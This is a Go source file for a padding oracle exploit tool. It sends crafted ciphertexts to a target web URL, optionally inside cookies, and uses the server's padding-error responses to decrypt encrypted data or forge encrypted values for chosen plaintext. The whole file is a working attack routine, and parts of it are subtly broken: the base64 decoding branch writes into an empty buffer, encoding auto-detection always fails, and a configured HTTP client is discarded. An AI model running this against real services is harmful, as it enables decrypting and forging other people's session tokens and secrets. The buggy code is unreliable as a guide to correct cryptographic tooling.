package pax

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/avast/retry-go"
	"github.com/viki-org/dnscache"
)

// ExploitOptions is a series of options to provide the encrypt/decryption functions
type ExploitOptions struct {
	BlockSize   int
	Method      string
	Cookies     string
	PlainText   string
	Encoding    Encoding
	FailureText string
}

type Encoding string

const (
	EncodingAuto      Encoding = "auto"
	EncodingNone      Encoding = "none"
	EncodingBase64    Encoding = "base64"
	EncodingURL       Encoding = "url"
	EncodingBase64URL Encoding = "base64-url"
)

var defaultOptions = &ExploitOptions{
	BlockSize: 16,
	Method:    http.MethodGet,
	Encoding:  EncodingAuto,
}

func (options *ExploitOptions) inherit() {
	if options.Method == "" {
		options.Method = defaultOptions.Method
	}
	if options.BlockSize == 0 {
		options.BlockSize = defaultOptions.BlockSize
	}
	if options.Encoding == "" {
		options.Encoding = defaultOptions.Encoding
	}
}

// Decrypt will take encrypted data and exploit a padding oracle to decrypt it.
func Decrypt(url string, sample string, options *ExploitOptions) ([]byte, error) {
	return newExploiter(url, sample, options).decrypt()
}

// Encrypt will take encrypted sample data and exploit a padding oracle to
// encrypt the given plaintext.
func Encrypt(url string, sample string, options *ExploitOptions) ([]byte, error) {
	return newExploiter(url, sample, options).encrypt()
}

type exploiter struct {
	client      *http.Client
	sample      string
	url         string
	blockSize   int
	method      string
	cookies     string
	plaintext   string
	encoding    Encoding
	failureText string
}

func newExploiter(url, sample string, options *ExploitOptions) *exploiter {
	if options == nil {
		options = defaultOptions
	} else {
		options.inherit()
	}

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	resolver := dnscache.New(time.Minute * 5)

	client.Transport = &http.Transport{
		MaxIdleConnsPerHost: 64,
		DialContext: func(ctx context.Context, network string, address string) (net.Conn, error) {
			separator := strings.LastIndex(address, ":")
			ip, err := resolver.FetchOneString(address[:separator])
			if err != nil {
				return nil, err
			}
			return net.Dial("tcp", ip+address[separator:])
		},
	}

	return &exploiter{
		sample:      sample,
		url:         url,
		plaintext:   options.PlainText,
		blockSize:   options.BlockSize,
		method:      options.Method,
		cookies:     options.Cookies,
		client:      &http.Client{},
		encoding:    options.Encoding,
		failureText: options.FailureText,
	}
}

func (x *exploiter) decode(input []byte) ([]byte, error) {
	encoding := x.encoding
	if x.encoding == EncodingAuto {
		var err error
		encoding, err = x.sniffEncoding(input)
		if err != nil {
			return nil, err
		}
	}

	switch encoding {
	case EncodingNone:
		return input, nil
	case EncodingURL:
		decoded, err := url.QueryUnescape(string(input))
		return []byte(decoded), err
	case EncodingBase64:
		var dst []byte
		_, err := base64.StdEncoding.Decode(dst, input)
		return dst, err
	case EncodingBase64URL:
		decoded, err := url.QueryUnescape(string(input))
		if err != nil {
			return nil, err
		}
		dst := make([]byte, base64.StdEncoding.DecodedLen(len(decoded)))
		n, err := base64.StdEncoding.Decode(dst, []byte(decoded))
		return dst[:n], err
	default:
		return nil, fmt.Errorf("encoding '%s' is not supported", encoding)
	}
}

func (x *exploiter) encode(input []byte) ([]byte, error) {
	switch x.encoding {
	case EncodingNone:
		return input, nil
	case EncodingURL:
		return []byte(url.QueryEscape(string(input))), nil
	case EncodingBase64:
		dst := make([]byte, base64.StdEncoding.EncodedLen(len(input)))
		base64.StdEncoding.Encode(dst, input)
		return dst, nil
	case EncodingBase64URL:
		dst := make([]byte, base64.StdEncoding.EncodedLen(len(input)))
		base64.StdEncoding.Encode(dst, input)
		return []byte(url.QueryEscape(string(dst))), nil
	default:
		return nil, fmt.Errorf("encoding '%s' is not supported", x.encoding)
	}
}

var ErrUnknownEncoding = fmt.Errorf("failed to determine encoding")

func (x *exploiter) sniffEncoding(sample []byte) (Encoding, error) {
	return EncodingAuto, ErrUnknownEncoding
}

func (x *exploiter) decrypt() ([]byte, error) {

	fmt.Println("Decoding sample...")
	sample, err := x.decode([]byte(x.sample))
	if err != nil {
		return nil, err
	}

	fmt.Println("Checking sample...")
	if len(sample)%x.blockSize > 0 {
		return nil, fmt.Errorf("sample data is incorrect length for given blocksize")
	}

	fmt.Println("Trying oracle with sample data...")
	valid, err := x.try(sample)
	if err != nil {
		return nil, err
	}
	if !valid {
		return nil, fmt.Errorf("sample data does not appear to be valid")
	}

	blockCount := len(sample) / x.blockSize

	var plaintext []byte

	for blockIndex := 1; blockIndex < blockCount; blockIndex++ {

		fmt.Printf("Working on block %d of %d...\n", blockIndex, blockCount-1)

		targetBlock := sample[blockIndex*x.blockSize : (blockIndex+1)*x.blockSize]
		blockPlaintext := make([]byte, x.blockSize)

		intermediate, err := x.attackBlock(targetBlock)
		if err != nil {
			return nil, err
		}

		for i := 0; i < x.blockSize; i++ {
			blockPlaintext[i] = sample[((blockIndex-1)*x.blockSize)+i] ^ intermediate[i]
		}

		plaintext = append(plaintext, blockPlaintext...)
	}

	fmt.Println("Removing padding from solution...")

	return pkcs7Unpad(plaintext, x.blockSize)
}

func (x *exploiter) encrypt() ([]byte, error) {

	plaintext, err := pkcs7Pad([]byte(x.plaintext), x.blockSize)
	if err != nil {
		return nil, err
	}

	blockCount := len(plaintext) / x.blockSize
	blockOutput := make([]byte, x.blockSize)
	output := make([]byte, x.blockSize)

	for blockIndex := blockCount; blockIndex > 0; blockIndex-- {

		fmt.Printf("Working on block %d of %d...\n", blockIndex+1-blockCount, blockCount)

		intermediate, err := x.attackBlock(blockOutput)
		if err != nil {
			return nil, err
		}

		for i := 0; i < x.blockSize; i++ {
			blockOutput[i] = plaintext[((blockIndex-1)*x.blockSize)+i] ^ intermediate[i]
		}

		output = append(blockOutput, output...)
	}

	return x.encode(output)
}

func (x *exploiter) attackBlock(targetBlock []byte) ([]byte, error) {

	intermediate := make([]byte, x.blockSize)
	prefix := make([]byte, x.blockSize)
	crafted := append(prefix, targetBlock...)

	for byteIndex := x.blockSize - 1; byteIndex >= 0; byteIndex-- {

		// calculate values so that all N bytes after the one we're targeting equal N
		for p := x.blockSize - 1; p > byteIndex; p-- {
			padTarget := byte(x.blockSize - byteIndex)
			crafted[p] = padTarget ^ intermediate[p]
		}

		var found bool
		for i := 0; i <= 0xff; i++ {

			crafted[byteIndex] = byte(i)

			valid, err := x.try(crafted)
			if err != nil {
				return nil, err
			}

			if valid {
				found = true
				break
			}
		}

		if !found {
			crafted[byteIndex] = 0
			return nil, fmt.Errorf("could not find bad padding")
		}

		intermediate[byteIndex] = crafted[byteIndex] ^ byte(x.blockSize-byteIndex)

	}

	return intermediate, nil

}

// returns true if payload is valid
func (x *exploiter) try(payload []byte) (bool, error) {

	encoded, err := x.encode(payload)
	if err != nil {
		return false, err
	}

	fullURL := strings.ReplaceAll(x.url, x.sample, string(encoded))

	req, err := http.NewRequest(x.method, fullURL, nil)
	if err != nil {
		return false, err
	}

	if x.cookies != "" {
		cookies := strings.Split(x.cookies, ";")
		for _, cookie := range cookies {
			parts := strings.SplitN(cookie, "=", 2)
			if len(parts) == 2 {
				req.AddCookie(&http.Cookie{
					Name:   strings.TrimSpace(parts[0]),
					Value:  strings.ReplaceAll(strings.TrimSpace(parts[1]), x.sample, string(encoded)),
					Path:   "/",
					Domain: req.Host,
				})
			}
		}
	}

	var statusCode int
	var body string

	if err := retry.Do(func() error {
		response, err := x.client.Do(req)
		if err != nil {
			return fmt.Errorf("request to oracle failed with error: %s", err)
		}

		data, err := ioutil.ReadAll(response.Body)
		if err != nil {
			return err
		}
		body = string(data)

		defer func() {
			_ = response.Body.Close()
		}()
		if response.StatusCode == http.StatusBadGateway ||
			response.StatusCode == http.StatusGatewayTimeout ||
			response.StatusCode == http.StatusServiceUnavailable {
			return fmt.Errorf("request to oracle failed with HTTP status %d", response.StatusCode)
		}
		statusCode = response.StatusCode
		return nil
	}, retry.Attempts(5)); err != nil {
		return false, err
	}

	if x.failureText != "" {
		return !strings.Contains(body, x.failureText), nil
	}

	if statusCode > 399 {
		return false, nil
	}

	return true, nil
}
